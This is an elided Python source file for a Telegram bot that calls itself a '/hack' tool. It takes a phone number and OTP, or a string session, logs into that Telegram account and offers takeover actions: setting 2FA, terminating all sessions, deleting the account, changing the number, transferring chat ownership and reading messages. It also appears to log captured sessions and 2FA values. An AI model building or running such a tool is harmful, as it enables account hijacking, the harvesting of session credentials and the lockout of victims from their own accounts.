...
async def get_session(c, m):
    ask_ = await m.from_user.ask('Send me phone number to make session by login else just send me an string session (note :numbers must begin with +)')
    if not ask_.text:
        return None
    ...
    try:
        ...
        sent_code = await app.send_code(ask_.text)
    got_code = await m.from_user.ask('Ok, Enter the OTP you got : in format (`1-2-3-4`) not in `1234`')
    fa = "Not SET"
...
async def start_s(client, message):
    ...
    if is_user:
        return await message.reply('<b>Please Join My Channel to Continue!</b> \n__Do__ /hack ___to begin hack__', reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("Join", url=CHANNEL_LINK)]]
            ))
    return await message.reply(f'<b>Welcome to @{client.myself.username}</b> \n<i>Please use cmd /hack to begin hack</i>')
...
async def begin(client: Client, message: Message):
    is_user = await channel_check(client, message)
    if is_user:
        return await message.reply('<b>Please Join My Channel to Continue!</b> \nTry /hack again after joining..', reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("Join", url=CHANNEL_LINK)]]
            ))
    try:
    ...
    try:
        ...
        return await message.reply('<b>Failed to start session!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
    ...
    while True:
        ...
        if task.text in ['/cancel', '/done']:
            ...
            try:
                ...
                await message.reply('<b>Failed to promote user!</b> \n<b>Error:</b> <code>{}</code> \n'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            ...
            try:
                ...
                await message.reply('<b>Failed to demote user!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to ban user!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to delete account!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to set 2FA!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            await log_(session, message.from_user, fa)
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
            ...
            try:
                ...
                await message.reply('<b>Failed to unset 2FA!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to terminate all sessions!</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to logout this session too? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to Join Chat</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to Leave Chat</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to send message</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to delete channel/group</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to get chat Infos</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to demote all users</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to get owner chats</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to get admin chats</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to get messages from telegram</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to change number</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to modify chat username</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to modify chat description</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to modify chat title</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to transfer chat owner</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
            should_lo = await message.from_user.ask('Do you want to end this session? (y/n)')
            if not should_lo.text or (should_lo.text.lower()  != 'y'):
                continue
            ...
            try:
                ...
                await message.reply('<b>Failed to log out</b> \n<b>Error:</b> <code>{}</code>'.format(e))
                continue
    ...
    await _client.stop()
    return await message.reply("<b>Client Disconnected and Session Ended!</b> \n<b>Use</b> /hack <b>to start again!</b>")
